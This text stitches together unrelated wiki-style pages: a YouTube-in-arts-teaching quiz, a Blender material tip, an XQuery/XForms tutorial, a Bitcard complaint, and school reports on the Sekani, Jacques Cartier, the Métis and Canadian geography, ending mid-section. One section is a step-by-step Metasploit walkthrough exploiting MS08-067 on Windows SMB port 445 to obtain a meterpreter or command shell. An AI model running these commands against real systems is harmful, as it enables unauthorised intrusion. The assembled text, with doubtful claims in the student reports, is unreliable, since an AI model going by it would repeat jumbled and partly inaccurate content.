In short, when used properly, YouTube is a valuable tool for K-12 performance arts educators.  It is the job of the school technical coordinator to help make teachers aware of this resource and help teachers use them appropriately.  

==Challenge!==

1)	What are two ways YouTube can be used to help in teaching the performing arts?

2)	What problems of multimedia sharing does the use of YouTube solve?

3)	What is one way a teacher can help protect a student’s identity in using YouTube with K-12 students?

4)	What performing arts subjects are particularly suited to the use of YouTube for teaching purposes?

==Answers==

1) YouTube can help in learning new techniques, giving examples of entire pieces, sharing final products, and finding inspiration.

2) YouTube solves problems of compatibility of formats and also of bandwidth.

3) Teachers can avoid putting students full names on YouTube, post only videos of the teachers themselves, and get parents permission before using YouTube in the classroom.

4) Dance, music, and art are particularly suited to using YouTube for teaching.

      <text xml:space="preserve">== Plastic is Easy ==
Yes, this page won't actually tell you what you specifically need for plastic, because it's a very simple material. People think too much, so &quot;I&quot; am here to tell you that sometimes the solution is the simplest one.&lt;br&gt;
&lt;br&gt;
'''Hard Plastic''' is made by taking the standard material (the material created when you hit the &quot;Add New&quot; button) and taking the &quot;Hard&quot; Value under the &quot;Shaders&quot; tab and turning it up. You can also turn up the &quot;Spec&quot; Value, also located under the &quot;Shaders&quot; tab.&lt;br&gt;
Nothing to it. Like every other material you can add scratches by making very thin normal maps and very lightly applying them, and maybe make the plastic reflective by turning on a very shallow &quot;RayMir&quot; property.

      <text xml:space="preserve">== A simple manual exploitation using metasploit ==

Assumptions:

* you are using metasploit's latest version and exploits (svn / subversion)
* The target machine is a windows box with windows XP (SP1,SP2,SP3) or Windows 2003 (SP0)
* The target machine has port 445 open (check it via nmap -p 445 &lt;target machine's ip&gt;


Steps:

*1. load msfconsole of metasploit
*2. msf &gt; info exploit/windows/smb/ms08_067_netapi
*3. msf&gt; use exploit/windows/smb/ms08_067_netapi
*4. msf exploit(ms08_067_netapi) &gt; show options
*5. msf exploit(ms08_067_netapi) &gt; set RHOST &lt;target ip&gt;
*6. msf exploit(ms08_067_netapi) &gt; set PAYLOAD windows/meterpreter/bind_tcp
*!. You can also use generic/shell_bind_tcp as payload to get a command prompt.
*7. msf exploit(ms08_067_netapi) &gt; set TARGET &lt;choose the target with the corresponding id given via the 'show targets' command &gt;.
*8. msf exploit(ms08_067_netapi) &gt; exploit


If everything goes like this, you will get a meterpreter shell. From there onwards you can do post exploitation stuff ( explained in Post exploitation activities|http://en.wikibooks.org/wiki/Metasploit/post_exploitation)

      <text xml:space="preserve">== Motivation ==
You want to store all your code tables in a central location and have each form dynamically generate selection lists from these code tables.

== Method ==
We will create a very simple XML file format to store all our codes.  We will store one code table per file and then write a simple XQuery that goes through all these files to build a sample selection list.  This selection list will create an instance in the model to hold each selection list value.  It will also populate the instance with the first value in the list.

In our sample, we will assume an XRX file naming standard such as '''/db/apps/app-name/code-tables/my-code-table.xml''' where each application contains its own code tables for maximum application portability between systems.  Applications that share code tables can store these in a location such as '''/db/shared/code-tables/my-code-table.xml'''

== Sample Screen Image ==
[[Image:selection-list-generator.jpg|center|frame|Output from Selection List Generator]]

== XML File Format ==
&lt;source lang=&quot;xml&quot;&gt;
&lt;code-table&gt;
    &lt;code-table-name&gt;PublishStatusCode&lt;/code-table-name&gt;
    &lt;definition&gt;A way to classify the publishing workflow of an item.&lt;/definition&gt;
    &lt;items&gt;
        &lt;item&gt;
            &lt;label&gt;Draft&lt;/label&gt;
            &lt;value&gt;draft&lt;/value&gt;
        &lt;/item&gt;
        &lt;item&gt;
            &lt;label&gt;Under Review&lt;/label&gt;
            &lt;value&gt;under-review&lt;/value&gt;
        &lt;/item&gt;
        &lt;item&gt;
            &lt;label&gt;Published&lt;/label&gt;
            &lt;value&gt;published&lt;/value&gt;
        &lt;/item&gt;
    &lt;/items&gt;
&lt;/code-table&gt;
&lt;/source&gt;

== Sample XQuery ==

This query goes through all the files in the XRX application '''code-tables''' collection and looks for XML files that have '''code-table''' as the root element.  It then creates a report that contains all the selection lists inside a working XForms application.

&lt;source lang=&quot;xml&quot;&gt;
xquery version &quot;1.0&quot;;
import module namespace style ='http://code.google.com/p/xrx/style' at '/db/xrx/modules/style.xqm';
declare namespace xhtml=&quot;http://www.w3.org/1999/xhtml&quot;;

(: XQuery to construct an XForm for either a new item or update item :)
declare option exist:serialize &quot;method=xhtml media-type=application/xhtml+xml indent=yes&quot;; 

let $app-collection := style:app-base-uri()
let $code-table-collection := concat($app-collection, '/code-tables')
let $code-tables := collection($code-table-collection)/code-table

return
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; 
xmlns:xf=&quot;http://www.w3.org/2002/xforms&quot; 
xmlns:ev=&quot;http://www.w3.org/2001/xml-events&quot;&gt;
   &lt;head&gt;
      &lt;title&gt;XForms Selection List Tester&lt;/title&gt;
      {style:import-css()}
      &lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;block-form.css&quot;/&gt;
      &lt;xf:model&gt;
         &lt;!-- This instance holds the value of each code --&gt;
         &lt;xf:instance xmlns=&quot;&quot; id=&quot;save-data&quot; src=&quot;&quot;&gt;
            &lt;data&gt;
               {for $code-table in $code-tables
                 return
                    element {$code-table/code-table-name/text()} {$code-table/items/item[1]/value/text()}}
            &lt;/data&gt;
         &lt;/xf:instance&gt;
      &lt;/xf:model&gt;
   &lt;/head&gt;
   &lt;body&gt;
      {style:header()}
      {style:breadcrumb()}
      &lt;h1&gt;Sample with a Model in the XForm&lt;/h1&gt;
      {for $code-table in $code-tables
         let $code-table-name := $code-table/*:code-table-name/text()
      return
         &lt;xf:select1 ref=&quot;{$code-table-name}&quot;&gt;
            &lt;xf:label&gt;{$code-table-name}: &lt;/xf:label&gt;
            {for $item in $code-table/*:items/*:item
              return
                 &lt;xf:item&gt;
                    &lt;xf:label&gt;{$item/*:label/text()}&lt;/xf:label&gt;
                    &lt;xf:value&gt;{$item/*:value/text()}&lt;/xf:value&gt;
                 &lt;/xf:item&gt;}
            &lt;xf:hint&gt;{$code-table/*:definition/text()}&lt;/xf:hint&gt;
         &lt;/xf:select1&gt;
      }
      {style:footer()}
   &lt;/body&gt;
&lt;/html&gt;
&lt;/source&gt;

Note that this XQuery uses element constructors to create element names in the instance.  It also uses the '''*:name''' notation to put data from the null namespace directly into the XForms namespace.

This file also puts the definition of the element directly into the hits of the XForms application. Under some XForms applications such as Firefox the hint appears in a floating ephemeral mode display in the left margin of the form.

== Sample CSS File ==

Here is the '''block-form.css''' file that can be used to make each selection appear on a separate line:

&lt;source lang=&quot;xml&quot;&gt;
@namespace xf url(&quot;http://www.w3.org/2002/xforms&quot;);
body {font-family: Arial, Helvetica; sans-serif;}

/* This line ensures all the separate input controls appear on their own lines */
xf|output, xf|input, xf|select, xf|select1, xf|textarea {display:block; margin:5px 0;}

/* Makes the labels right aligned in a column that floats to the left of the input controls. */
xf|select &gt; xf|label,
xf|select1 &gt; xf|label
{text-align:right; padding-right:10px; width:250px; float:left;}
&lt;/source&gt;

[[Image:BitCardCPAN.png|thumb|Inept rt.cpan.org home screen after BitCard login]]

'''Bitcard''' is a both archaic unified login protocol, based roughly on TypeKey, and the aptly named proprietary website that functions as the sole provider of BitCard accounts. Unfortunately, the only major services that permit Bitcard is [http://rt.cpan.org rt (CPAN's default bug tracker uses it)], and [http://cpanratings.perl.org/ CPAN ratings].

== RT (CPAN Bug Tracker) ==
When it comes to rt, if you choose to use Bitcard you will have an inept interface that will only permit bug-reporting and ''Search Distributions'' and ''Browse Distributions.''  No one should ever use a Bitcard account: [http://pause.perl.org/pause/query?ACTION=request_id get a pause account] that will allow all of the CPAN bug reporting and in addition the creation of new CPAN modules and distributions.

What exactly won't you be able to do with a Bitcard account? Well, a few of the many features:
*create modules
*edit your tickets by changing the priorities or status
*use advanced queries to find specific tickets
*locate all of the tickets filed by yourself
*collaborate on solving the bugs you reported

If you do use a Bitcard account and want to later submit a module for inclusion into CPAN, or maintain a CPAN module at a later time you will not be able to bring your previous bug reports over into your pause login.

== CPAN Ratings ==
The official CPAN ratings site does not have an alternate login yet. Bitcard is required to rate modules.

== Deleting your Bitcard account ==

You can't... Sorry, got it for life.

      <text xml:space="preserve">A bark lodge present in the few Sekani family that settled in one place more for longer than a week.

==Diet==

Living in the Rockies, food was hard to come by.  The most common foods were: 

Moose - Moose were one of the most common game in the Sekani area. 
Caribou - Just like moose, Caribou was very common. 
Bear - The Sekani's hunted bear as much as they could manage.  It was very tasty and put up much more of a fight for the hunters. 
Porcupine - Many Sekani's were injured trying to hunt this tricky animal.  It was only after they actually got one that they found out it wasn't very tasty. 
Beaver - Like Porcupine, the only reason that these were hunted would be lack of food or the tough skins that beavers yielded. 
Fish - Fish was the thing the Sekani's hated the most.  It didn't fill them up, and they only hunted fish out of necessity.

The only reason the Sekani did not continually hunt Moose, was because they were in scarce quantities.  Almost everything else was hunted out of hunger.

Most of the Sekani diet was constructed of protein, with very little vegetables present.  Some sources say they ate medicinal herbs, to ease pain or induce sleep.
 
==Technology==
  
Even though these aren't Sekani hunters, it still give you the general idea of the fishing techniques.

Bow and arrow were the prime hunting weapon, as they provided excellent speed and range.  A common hunting technique would have around 10 hunters all fire arrows aimed at the head of the prey.  This tactic worked very well, except on smaller animals, where accuracy was vital.  They used bow and arrows on fish, where sheer numbers of arrows would be the deciding factor on the kill.

Nets constructed of willow bark or nettle fibre were used to catch fish when they could not find any other food.  They did not use very many boats.  The small lakes iced over enough to allow the nets to be dragged across the lake, yielding plentiful catches of ice fish.  Another effective method was shallow water trident fishing.

The Sekani preferred to use almost every material but stone.  The only things they used stone for were the fishing tridents and the animal hunting arrows and spears.  The most popular material for a blade was a beaver tooth filed to a sharp point.
 
==Environment==
 
As the name suggests, these people live in harsh conditions that are the Rocky Mountains, sleeping in caves and open, unprotected brush huts. Although they almost always dwell close to clear, clean rivers, they never bathe in them because they are much too cold.  Even when taking water from such streams, they must bring it into a sheltered area to let it increase in temperature before drinking.  

Most prefer to stay in the plentiful area at the base of the mountain, just a few kilometers from the treeline, where the water is warm and the berries are plentiful.  It is a mystery to most historians why some would choose to stay in the harsh conditions of the upper mountains.  Some suspect that no competition from other tribes would be a great factor in this choice.  Also the fact that the journey up to the upper Rockies is treacherous for large groups of people.

The Tse'Khene (Sekani) territory.  If you compare it to the map on the left, it matched exactly with the rocky mountain estimate.  (Tse'Khene is an alternative name for the Sekani.)

A rough area estimate of the Rocky Mountains.

==Culture==

The Sekani People have their own unique language, yet it is very similar to most Athabaskan languages.  Some very brief rules are listed below:

==Tone==
Sekani has two tones, low and high. High is the default. That is, syllables normally have high tone. Syllables phonologically marked for tone are low.

Even though most Athapaskan tribes used tattoos, the Sekani People did not.  Paint did not seem to be discluded, as it was freely seen on their ceremonial clothes and headdresses. 
The Sekani People lacked major gods.  Instead, they believed in the connections between man and animals.  They believed that each animal had a minor god associated with it. 
The Sekani's believed that each man had an animal protecting his spirit, and that the traits of that animal were present in that man's abilities.  A man with a black bear spirit would be very strong and have a large build. 
Each band had a shaman.  A shaman was like the witch doctor of the Sekani tribes.  The shaman knew of medicinal herbs and was said to be able to cure illnesses with spirits.  On the flipside, if someone offended a shaman, he could inflict sickness upon the offender.

==Clothing==
 
This Sekani pattern would have showed a family of great status.  Notice the massive amounts of purple dye used in this piece.

The Sekani people used skin from every animal they hunted, including fish.  They found that the skin on the heads of the fish, once dried and sewn together, makes tough, durable shoulder and knee coverings.  The reason this worked for them was because the fish they hunted were used to the cold and had tough, hard skin.

Paint was a major part in clothing for this tribe.  Different colors often showed how rich each family was.  Purple is the most blatant example of this, as purple paint was difficult to come by.  It first had to be harvested from crushed bugs, then cooked at just the right temperature so that it would turn a purple color.  Too long/short to cook would mean that it would turn an ugly brown color, which is the worst possible outcome, because brown was the most common color of paint.

      <comment>/* Jacques Cartier */</comment>
      <text xml:space="preserve">== Jacques Cartier ==
Jaques Cartier departed on his first voyage in 1534. He was in search of a passage to East Asia around North America. After twenty days at sea, he arrived on the coast of Newfoundland. There, he entered the Straight of Belle Island, explored the Bay of St. Lawrence, crossed to the Magdalene Islands and circled Prince Edward Island. In the Chaleur Bay, he met fifty Micmac and returned to their village to celebrate and trade. Disappointed that the bay was not the route to China as Cartier had hoped, he continued onwards. Along the coast of Quebec, Cartier surprised a fishing party of two hundred Hurons headed by Chief Dannaconna. The Hurons welcomed Cartier and he returned to their village. At that point, Cartier decided to sail back to France and bring Donnaconna’s two sons with him: Domagaia and Taignagny. 

The following year, Cartier set forth once more, spurred by rumors of a large river further west. Perhaps this was the route to Asia that evaded him the year before. Cartier sailed to the Huron Village of Stadacona in present day Quebec. Dadaconna greeted him affably, but refused him passage further west. Three Huron medicine men disguised themselves as devils and warned him to travel no further. Cartier laughed and continued heedlessly. Soon, he reached Hochilaga: another Huron village. Extensive festivities followed. A few days later, Cartier decided the St. Lawrence was not the route to China and returned to Stadaconna for the winter. 

Over the winter, Cartier’s men became very ill from scurvy. Out of one hundred and ten men, less than ten were strong enough to look for food. Afraid that the natives might attack them if they discovered that the French were ill, Cartier ordered his men to make a lot of noise as they traveled through the forest. This, he wagered, would make it sound as if the number of hunters were greater. If not for Domagaia, Cartier and his men would probably have perished. Domaigaia, after eating the bark and needles of a white cedar, became healthy once more. He shared this news with Cartier and a week later all of the men were cured. 

Knowing that the French liked tales of riches, the Hurons told storied of a land called Saguenay wealthy in gold and treasures further north. These stories were not true but the French were easily fooled. Cartier headed back to France and kidnapped Dannaconna and his sons so that they could tell these stories to King Francois I. 

Cartier hoped to launch another voyage, this time to find Saguanaya, but was impeded by France’s war with Spain. He was unable to depart until 1541. This time, Cartier was forced to serve under Jean-Francois de la Rocque, sieur de Roberval. The French visited Stadacona and built a fort at the mouth of Saguenay. The men collected what they thought were diamonds and gold, but were in reality quartz and iron pyrite. Cartier wintered at the fort (Charlesbourg-Royal). Over the winter, thirty five men were killed by Hurons angry that the French were setting up fort on tehir land.

The following spring, Cartier met Roberval in Newfoundland. Roberval attempted to convince Cartier to help him continue exploring. Instead, Cartier snuck back to France. There, Cartier remained. He lived in St. Malo and his nearby estate until his death in 1557 at age 66. The areas Cartier discovered would remain largely untouched by Europeans until the next century.

      <text xml:space="preserve">The Métis people are a group of indigenous peoples, and the results of marriages with members of the Saulteaux, Cree, Menominee, Ojibway, Algonquin, and Inuit, to Europeans (mainly French). The Métis are also known as Bois Brûlé, mixed-bloods or half-bloods, or Anglo-Métis. They are one of the three Aboriginal groups in Canada that are officially recognized as a Native group. The Métis live in Central Canada and the Northern United States of America. The word Métis means &quot;mixed race&quot; in French. 


= History =

In the 17th and 18th centuries there were two groups of Métis - one English speaking and one French speaking. Both originated during the fur trade of the 17th and 18th centuries. The English and Scottish traders and trappers of the Hudson’s Bay Company and Northwest Company often married women of indigenous nations, especially the Cree and Ojibwa.  The Métis lived near Hudson Bay trading posts, often working there.  At first the Métis people were not respected very well and often had to take low paying jobs with the Hudson Bay Company.  These people lived originally in the Canadian Shield, a large region of central and eastern Canada that is drained by rivers flowing into Hudson Bay. French fur traders also married the native peoples in the prairies as well, making the origin for the French speaking Métis population. The French-speaking Métis populations developed in two main areas—the Old Northwest (which is now the American Midwest) and Canada. 
In the Old Northwest, they were the principal entrepreneurs in the fur trade. Some of the fur trade posts they established became great cities, such as Detroit and Chicago. In the early 19th century, the French-speaking Métis in the Old Northwest either moved out or were absorbed into the culture of the American farmers who moved into the area. In Canada the French-speaking Métis lived in the prairies and in southern regions of the Canadian Shield, where they overlapped somewhat with the English-speaking Métis. Métis identity as a separate nation began to take shape during conflicts with the Red River colony, a farming community established on the Red River south of Lake Winnipeg in 1812. By this time the hunting of buffalo was a major part of the Métis economy, and the Métis feared that new settlers to their land would result in them not being able to hunt the buffalo. Action was taken by certain individuals to ensure that the Métis people would have a voice on the red river region and economy.  The Métis also had a large part to play in the Red River Rebellion. At the end of the rebellion, the Manitoba act was created giving the Métis freedom to live in their lands.

= Territory =

Other treaties also led to Métis freely living in Saskatchewan, Alberta, Manitoba, British Columbia, Ontario, and the North West Territories, North Dakota, North West Minnesota and Montana. The Métis largely canoed to get around in their territory through  river and lakes systems. 

= Food and hunting =

The Métis lived primarily off of buffalo that lived in the prairies and also other deer and wildlife that they could trap or shoot.  They also fished in the rivers and lakes, and picked berries and other vegetation. The Métis usually hunted bison with bows and arrows or they stampeded down cliffs on them. Their main food was pronghom antelope, moose, elk, mule deer, prairie bush rabbits and wild birds. They usually fished salmon, trout and pickeriel. Usually Métis women gathered berries too, and they were added to special meals.

= Religion = 

The Métis got their religion from the settlers that came to their land.  The English speaking Métis primarily followed Protestant Christianity, and the French speaking Métis primarily followed catholic Christianity.  Since the Métis people were made from European settlers, they don’t really have native religion like some of the other first nation peoples.

= Identity =

There is a large amount of controversy over the definition of a Métis, and who qualifies and should be recognized as a Métis. The only three factors used to legally identify a Métis are:
·         self-identification;
·         ancestral connection to a historic Métis community;
·         community acceptance. 

When the term was first created, ‘Métis’ referred to descendants of a marriage between one partner of Cree descent and another of French. Most often, it also referred to the descendants of the French Catholic Red River Métis. However, over time, the term Métis has come to refer also to those of other European and Native descent as well.

It has been debated whether the term 'Métis' should refer to people of only Cree and French descent, or of all descendants of Native and European marriage. As a compromise, 'métis', with a lower case 'm', is used to describe those of European and Native blood, while 'Métis' is used to describe those of French and Cree descent.

      <text xml:space="preserve">= Geography of the Lands =

Canada is the second largest country in the world, encompassing 9,970,610 km² of land. It is surrounded by three oceans, the Arctic, the Pacific, and the Atlantic.  Canada is comprised of 10 provinces and 3 territories, the provinces all lying in the South, and the territories in the North.  Canada’s climate is fairly moderate, with temperate weather to Arctic conditions in the North. It also has a mild terrain, generally having flatlands, with mountainous areas in the West, and lowlands in the East. There are 8 physical regions in Canada, the Appalachian Region, the Coastal Plains, the Great Lakes-St. Lawrence Lowlands, the Interior Plains, the Canadian Shield, the Western Cordillera, the Intermountain Region, and the Arctic. When Europeans came to Canada, they altered the physical environment, changing the wilderness to a more urban setting.

= Coastal Plains =

== Overview == 
The Coastal Plains are a low-land area along the East coast. It is separated from the inland by other features (mountains, rivers)It is roughly 3200km long, and 50-100km wide.

== Topography ==

Consists of flat or gently rolling hills. As well, swamps and marshes are common because most of the land is between 30 and 200m above sea level. The Mississippi Delta is found in the gulf of the Coastal Plains. It creates a great stretch of fertile land. Rivers carry sediment across the plains. This sediment is either; left behind in places and eventually forms floodplains, or carried to and left in river mouths/shallow water and form deltas.

== Climate ==

The climate in the coastal plain region varies greatly.In the North there are long and snowy winters, and hot, humid summers. In the South, there is a sub-tropical climate, with mild- warm winters. There are also hurricanes from late summer to early winter, violent storms with winds between 120 and 240km/hr, formed over large bodies of water.

== Vegetation ==

The soils in the Coastal Plains region are extremely sandy; therefore the plants that grow there adapt to that environment.There are a variety of species in the Coastal Plains The land was originally pine forests, but in some places, such as Mexico, lush rainforests have grown. 

= Interior Plains =

== Overview ==

The Interior Plains are very diverse, and one of the biggest regions. It also includes the &quot;Tornado Alley&quot;, in the central area of North America. It extends northwards to the Arctic, and goes south to Mexico.

== Topography ==

Elevations are separated by escarpments (a sharp change in elevation). The elevation gently rolls downward from west to east. The height of the land changes from 600 to 1500 meters above sea level.

== Climate ==

The climate of the Interior Plains is very diverse. Weather is very extreme; up north, long winters and summers are short and cool, and down south, summers are long and hot and winters are cold, however there is very little precipitation. Air from the Gulf of Mexico flows north, colliding into air from Canada, creating sudden and violent weather, such as tornadoes, blizzards, and hailstorms. 

== Vegetation ==

Much diversity as with climate; up North is Tundra, which is treeless area where the ground is always frozen, and down south there are deciduous and evergreen trees. In the Prairies there are tall grasses and even some that can grow to the height of a person.

= Canadian Shield =
== Overview ==

The Canadian Shield is more than 2 billion years old. It contains volcanic mountains levelled by erosion. The Canadian Shield covers Labrador, the Great Lakes, and the Interior Plains of Canada, and surrounds Hudson Bay and James Bay. It has valuable mineral deposits easily found due to glaciers stripping the top layer of the land.  

== Topography ==

There is barren rock left behind by glaciers in the Ice Age. Glacier debris dammed up rivers and forced changes in the direction of their flow, resulting in a chaotic pattern of rivers, lakes, swamps, and muskegs, also known as bogs. Elevation ranges from 100 to 500 metres above sea level. The elevation is low in the centre and north, but higher in the south. Hudson’s Bay and James Bay are clay-covered lowlands, with rivers flowing in.

== Climate ==

In the North there are long, cold winters, and short, cool summers.

== Vegetation ==

Boreal forest is the common vegetation. Flora in the Canadian Shield is more suited to the thin, sandy soil. There are some deciduous trees, which benefit the pulp and paper industry due to being small and weak. There are no trees above tree-line due to; the growing season being too short, lack of precipitation, and permafrost.&lt;/u&gt;

=The Arctic Islands=

The Arctic Islands is the northernmost region of earth and generally considered to be all areas above the Arctic Circle (66° 33’N). It encompasses parts of Canada, the US, Russia, Scandinavia and the whole of Greenland.  

The Arctic Islands is a formidable place of bitter cold and barren lands. During the winter, its landscape is dominated by 15 million square kilometres of polar sea ice, extending between the Atlantic and the Pacific oceans. This is reduced to six million square kilometres during the summer. Massive glaciers, such as the 2.8 million cubic kilometres of the Greenland Ice Cap, inhabit the Arctic’s northern mountains and surround the Arctic Ocean. 

Arctic Islands climate and vegetation varies greatly between regions. The Innuitian Region, a triangular shaped area mainly comprised by the Queen Elizabeth Islands, is mountainous and presently covered by glaciers. It contains the great Innuitian Mountains, composed of three ranges. In contrast, the Arctic Region consists largely of tundra (very flat lowlands). Trees cannot withstand the tundra’s low precipitation, harsh temperatures, and nutrient-poor soil, frozen with permafrost. Instead, short plants such shrubs, lichens, grasses, and 400 flower varieties sprout during this area’s 50-60 day growing season. Arctic plants are adapted to cold temperatures and a very short growing season. They grow rapidly in spring and remain short and clustered, sheltering each other, to survive harsh winds. 
 
Because of the Arctic Islands' distance from the equator, the climate is very cold and there are large differences between both solstices. For part of the year, the sun either never rises or never sets. During the 10-month winter, the average Arctic temperature is – 40° C. This rises to an average of 3 to 12° C in the summer. Most areas in the Arctic receive less than 50 cm of rain per year, making this region a desert.

= Western Mountain Region =

==Overview==
The Canadian Western Mountain Region is one of Canada's most ecologically diverse regions.

The Western Mountain Region is an area that lies between the Rocky and Coast Mountains. This region is thinly populated. It consists of some deserts, high plateaus, and mountains. Many of the rivers in this area flow into somewhat salty lakes. There are only a few areas suitable for agriculture.The habitat ranges from moist coniferous forests to desert. This diversity supports a strong resource economy and abundance of wildlife. The forestry, agriculture, and mining industries, as well as the energy sector and tourism, have created a high quality of life for the region, and provide benefits elsewhere. This prosperity, however, has come with considerable land development and conversion. The Canadian Intermountain is a landscape of varying elevation and climate that has resulted in a tremendous diversity of habitat types, including desert, grasslands, shrub-steppe, riparian, wetlands, dry and moist coniferous forests, and alpine tundra. Since there are enormous variations in climate and vegetation, there are many different kinds of animals, ones that can survive in dry, desert areas, others that can live in wet, rain forests and other that habituate high mountain altitudes.

==Eastern Border: The Rocky Mountains==

The high jagged peaks of the Rocky Mountains are due to that they are not very eroded down yet, for they are still young -- for mountain ranges. They are twice as high as the Appalachian Mountains. Signs of alpine glaciations are widely evident and in many places valley glaciers remain active. The alpine tundra is too harsh for trees, yet plants and animals nestle near the ground. Although harsh in climate, there are hot springs occasionally dotting the mountains. In the subalpine area, trees are small and stunted, mostly fire and cold tolerant conifers. The bent and gnarled bodies of spruce and fir trees tell the story of hard summers and harder winters near the mountain tops.                                                                      

==North Interior:==

The lower region has three mountain ranges (the Columbias, the Selkirks and the Purcells) and is bordered by two others (the Monashees and the Rockies), making it a land of peaks and valleys connected by rivers and lakes. Climate conditions vary according to the nearness to water. The geography creates rain shadows where one side of a mountain may get a lot of rain or snowfall and the other side gets little or none. It also creates micro-climates, where temperatures may be warmer in valleys than at higher elevations. The winters are snowy and summers warm. The average temperature in winter is -10 °Celsius, and in summer it is 20 °C. In the southern part of the region summers are warmer and drier, with temperatures climbing to 30 °C. The average snowfall in the southern part of the region is about 170 centimetres, or 67 inches, and in the northern part it is about 200 cm, or 80 inches. The valleys to the west Grand Forks and to the east Cranbrook are considered semi-arid, because they get less precipitation than the mountains and other valleys in the region.

In the higher region, the climate consists of light precipitation, freezing winters and cool summers with long days. In the northern reaches of this region temperatures range from -13 degrees Celsius in winter to 19 °C in summer. 

==Mid-Interior: Wet forests and high plateaus==

There are forests of both coniferous and deciduous trees thriving in the moderate climate. Trees such as Douglas fir, western hemlock, western red cedar, yellow cedar, white spruce, lodgepole and Ponderosa pine, birch grow in great variety because of the long growing seasons and temperate climate. Geographically positioned in the centre of the province on a high plateau and surrounded by mountains,the summers are dry and warm and there is much snowfall in the winter. Temperatures range from -15 degrees Celsius in winter to 22 ° Celsius in summer. While some areas are sheltered and do not receive much rain and snow, the mountains will receive high amounts, especially at higher elevations.

==South Interior: Desert==

The rain shadow effect greatly reduces the rain fall of the in the leeward slopes: the deserts. The rain shadow means the moist air (heavy cloud) wrings itself out on the windward side of the mountain because of condensation, and when the moist air gets to the leeward side, the opposite happens because the warmer air on that side can hold more moisture before having to dump it. The leeward side is warmer, therefore able to hold more moisture. The Thompson Okanagan Region has a plateau in the centre, and is bordered by the Cascade mountains to the west, the Cariboo mountains to the north and the Monashee and Selkirk mountains to the east. The south is dry, but the climate cools and becomes wetter heading north. This region has a four-season climate with less precipitation and more moderate winters than many other areas of the province. The summers in this region are warm, reaching 30 degrees Celsius or higher. Rainfall amounts vary from one part of the region to another, but the average annual precipitation in the valleys is about 280 millimetres. Winters are snowy, with cool temperatures that average -7 °C. Spring and fall are with warm days and cool nights because of the desert area. This region enjoys warm days and cool nights from May to September, and mild winter temperatures from November until April. The mountain ranges receive abundant snow in winter. The dry conditions in the southern part of the region create a true desert in the area around the city of Osoyoos.

==Wildlife and Vegetation of this Region:==

Plants in the ecozone are as varied as the landforms they grow on. Vegetation that may be common in one area are often completely absent from another. Trees in the area include Engelmann spruce, alpine fir, interior Douglas fir, lodgepole pine, western white pine, Rocky Mountain ponderosa pine, trembling aspen, western hemlock, Rocky Mountain red cedar, balsam poplar, paper birch, black spruce, white spruce, and western larch. Some of the other species found here are sagebrush, rabbitbrush, antelope-bush, mountain avens, bunchgrass, pine grass, and bluebunch wheat grass.

The large herbivores include caribou, mule deer, white-tailed deer, moose, mountain goat, California bighorn sheep, and American elk. The large carnivores are the black bear, grizzly bear, wolf, lynx, bobcat, and cougar. Some of the small herbivores here are hoary marmot, yellowbelly marmot, Columbian ground squirrel, beaver, golden-mantled squirrel, yellow pine chipmunk, redtail chipmunk, beaver, northern bog lemming, and pika. Small carnivores that are found here include coyote, red fox, marten, wolverine, muskrat, badger, marten, mink, pallid bat, and striped skunk.

Birds of prey such as northern saw-whet owl, short-eared owl, long-eared owl, burrowing owl, cooper's hawk, red-tailed hawk, sharp-shinned hawk, northern goshawk, and turkey vulture are found here. The shorebirds and seabirds of the area include long-billed curlew, spotted sandpiper, American bittern, common snipe, killdeer, and black tern. Songbirds of the Montane Cordillera include Stellar’s jay, black-billed magpie, sage thrasher, white-throated swift, red-winged blackbird, cedar waxwing, cassin's finch, house finch, purple finch, brown creeper, and American dipper. Waterfowl that are found here include sandhill crane, northern pintail, blue-winged teal, mallard, gadwall, redhead, ring-necked duck, canvasback, and Canada goose. The birds of the forest include blue grouse, sharp-tailed grouse, spruce grouse, chukar, California quail, Lewis' woodpecker, and downy woodpecker.

Some of the characteristic frogs and toads of the area are the wood frog, spotted frog, and western toad. One of the salamander species present here is the long-toed salamander. Snakes found in the region include rubber boa, common garter snake, racer, western rattlesnake, night snake, and western terrestrial garter snake. One of the lizards found here is the western skink.

Fish species that live in the ecozone include lake whitefish, chiselmouth, lake chub, peamouth, leopard dace, and redside shiner. White sturgeon and sockeye salmon both come to freshwater to spawn.

Molluscs found here include pig-toe, western-river pearl mussel, western floater, and arctic-alpine fingernail clam.

A few of the insects that live here are red turpentine beetle, boreal spittlebug, spring azure, mourning cloak, and migratory grasshopper.

= The Great Lakes and St. Lawrence Lowland =

The great lakes and the St. Lawrence Lowland are a small region in eastern Canada spanning the provinces of Ontario and Quebec. They were created by glacial movement during the last Ice Age.  This region is the smallest in North America, only 180,000 sg. km. 

== Topography ==
The Great Lakes and the St. Lawrence Lowland have a rolling landscape created when the glaciers retreated and corroded the landscape. Elevation varies from 100 to 400 metres above sea level. 
The St Lawrence Lowland has flat plains on either side of the St. Lawrence river. These flat plains rise into the Canadian Shield and the Appalachians Although it is small, it is the home of Canada's most populated cities/area, Toronto, Montreal and Ottawa. The Great Lakes are Canada's biggest source of fresh water, however, it is contaminated from surrounding cities.

== Climate ==
The great lakes region is very humid because of the Great Lakes. They store heat in the winter and cold in the summer.This climate allows for good growing season for crops.On average, around 100 cm of rain or snow is received every year.Winters get down to -30 degrees and up to 35 degrees in the summer

== Vegetation ==
The long growing season and fertile lands left over from the glacier allow for lots of crops and fruit to be grown.  Some of the crops grown in Western Ontario and Southern Quebec are tobacco, peaches, cherries, grapes , apples, hay, vegetables, such as carrots, corn, onions, beets, peas and beans. St Lawrence Lowland has lots of ranching which supply butter, cheese and meat for the region. The Great Lakes are home to a broad leaf forest, and the Lowland has a mixed forest of conifers and deciduous. Grass is also plentiful. Although not vegetation, fresh water is also a huge resource to the Great Lakes region.

= The Appalachian Highlands of Canada =

The Appalachian Highlands of Canada is a vast, mountainous area along the east coast. Some of the oldest fold mountains in the world (created by colliding plates) traverse the land in an almost unbroken line. The region extends through Newfoundland, New Brunswick, and Nova Scotia.

==Climate==
 
The Appalachian Highlands climate is controlled by two major ocean currents.  The Arctic sends cold water south through the Labrador Current, bringing freezing winter temperatures to the Northern areas. Warm Caribbean water is propelled through the Gulf Stream to the coast of North America by before diverging towards Europe. The meeting of these two water bodies – warm and cold- offers an abundance of plankton and microscopic organisms, encouraging the growth of fish populations. In colonial days, the multitude of fish found in the Appalachian Region was a chief attraction for colonization. Although chronic over fishing has virtually eliminated many of these stocks, the Appalachians still boast a diversity of species sustained by the converging currents and climates. 
 
==Geography==
          
